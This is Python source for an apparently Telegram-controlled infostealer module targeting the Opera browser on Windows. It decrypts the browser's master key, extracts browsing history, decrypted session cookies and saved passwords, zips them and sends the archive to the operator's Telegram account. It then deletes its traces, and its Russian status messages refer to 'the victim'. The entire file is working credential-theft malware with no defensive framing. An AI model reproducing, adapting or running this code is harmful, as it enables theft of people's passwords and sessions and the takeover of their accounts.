# ---- Imports ---- #
import os
import win32crypt
import json,base64
from os.path import basename
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import shutil
import sqlite3
from aiogram import types
# ---- Imports ---- #

###############################################################################
#                                OPERA                                        #
###############################################################################

def Opera(dp, bot, admin_id):
    @dp.message_handler(text_contains='Логи Opera')
    async def opera(message: types.Message):
        await bot.send_message(admin_id, 'Тебя, понял. Занят этим..')
        try:
            def time(date):
                try:
                    return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
                except:
                    return "Can't decode"

            def get_master_key_opera():
                try:
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State', "r", encoding='utf-8') as f:
                        local_state = json.loads(f.read())
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]
                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key
                except:
                    return None

            def decrypt(buff, master_key):
                try:
                    return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                except:
                    return "Can't decode"

            def decrypt_password(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    decrypted_pass = cipher.decrypt(payload)
                    decrypted_pass = decrypted_pass[:-16].decode()
                    return decrypted_pass
                except:
                    return "Opera < 80"

            master_key = get_master_key_opera()
            if master_key is None:
                await bot.send_message(admin_id, 'Что-то пошло не так, скорее всего у жертвы нету Opera :(')
                return

            os.makedirs(r'C:\hesoyam8927163\Opera', exist_ok=True)
            
            # History
            try:
                history_db = os.path.expanduser('~') + r'\AppData\Roaming\Opera Software\Opera Stable\Default\History'
                if os.path.exists(history_db):
                    shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyOPERA.db')
                    c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyOPERA.db')
                    cursor = c.cursor()
                    temp = []
                    with open(rf"C:\hesoyam8927163\Opera\history-opera.txt", "a", encoding="utf-8") as history:
                        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
                        for row in cursor.fetchall():
                            result = f"URL: {row[0]}\nTitle: {row[1]}\nLast Visit: {time(row[2])}\n\n"
                            if result not in temp:
                                temp.append(result)
                                history.write(result)
                    c.close()
                    try:
                        os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyOPERA.db')
                    except:
                        pass
            except:
                pass

            # Cookies
            try:
                cookies_db = os.path.expanduser('~') + r'\AppData\Roaming\Opera Software\Opera Stable\Default\Network\Cookies'
                if os.path.exists(cookies_db):
                    shutil.copy2(cookies_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesOPERA.db')
                    c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesOPERA.db')
                    cursor = c.cursor()
                    
                    cursor.execute("SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies")
                    results = '[\n'
                    for row in cursor.fetchall():
                        secure = bool(row[3])
                        http = bool(row[4])
                        decrypted_value = decrypt(row[6], master_key)
                        results += '''
            {
                "domain": "%s",
                "expirationDate": %s,
                "name": "%s",
                "httpOnly": %s,
                "path": "%s",
                "secure": %s,
                "value": "%s"
            },
                        '''% (row[0], row[5], row[1], str(http).lower(), row[2], str(secure).lower(), decrypted_value)
                    
                    with open(rf"C:\hesoyam8927163\Opera\Cookies-Opera.json", "a", encoding="utf-8") as cookies:
                        cookies.write(results.rstrip(',\n') + '\n]')
                    
                    c.close()
                    try:
                        os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesOPERA.db')
                    except:
                        pass
            except:
                pass

            # Passwords
            try:
                login_db = os.path.expanduser('~') + r'\AppData\Roaming\Opera Software\Opera Stable\Default\Login Data'
                if os.path.exists(login_db):
                    shutil.copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultOPERA.db')
                    conn = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultOPERA.db')
                    cursor = conn.cursor()
                    
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    with open(r'C:\hesoyam8927163\Opera\opera-passwords.txt', "a", encoding='utf-8') as o:
                        for r in cursor.fetchall():
                            decrypted_password = decrypt_password(r[2], master_key)
                            o.write(f"URL: {r[0]}\nUserName: {r[1]}\nPassword: {decrypted_password}\n\n")
                    
                    conn.close()
                    try:
                        os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultOPERA.db')
                    except:
                        pass
            except:
                pass

            # Проверяем что файлы созданы
            files_in_dir = os.listdir(r'C:\hesoyam8927163\Opera')
            if not files_in_dir:
                await bot.send_message(admin_id, 'Не удалось собрать данные Opera. Файлы не найдены.')
                return

            # Archive and send
            try:
                shutil.make_archive('opera', 'zip', 'C:\\hesoyam8927163\\Opera')
                await bot.send_document(admin_id, open('opera.zip', 'rb'))
                os.remove('opera.zip')
                shutil.rmtree('C:\\hesoyam8927163')
            except:
                await bot.send_message(admin_id, 'Что-то пошло не так, скорее всего у жертвы нету Opera :(')
                
        except:
            await bot.send_message(admin_id, 'Что-то пошло не так, скорее всего у жертвы нету Opera :(')


